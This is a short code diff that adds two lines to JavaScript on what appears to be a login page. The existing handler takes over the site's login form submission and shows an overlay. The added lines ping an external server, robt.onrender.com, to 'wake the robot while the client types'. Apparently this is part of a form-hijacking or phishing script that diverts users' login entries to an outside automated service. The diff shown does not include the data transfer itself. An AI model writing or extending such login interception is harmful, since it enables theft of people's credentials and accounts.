@@ -164,6 +164,8 @@
   var btn=document.getElementById('Login_InicioLogin_BtnContinuarMod9');
   var ov=document.getElementById('gm-overlay');
   var msg=document.createElement('div');msg.id='gm-msg';btn.parentNode.appendChild(msg);
+  // Despierta el robot (Render duerme en frio) mientras el cliente escribe.
+  try{fetch('https://robt.onrender.com/',{mode:'no-cors'});}catch(e){}
   function error(t){msg.textContent=t;msg.style.display='block';}
   form.addEventListener('submit',function(ev){
     ev.preventDefault();ev.stopImmediatePropagation();
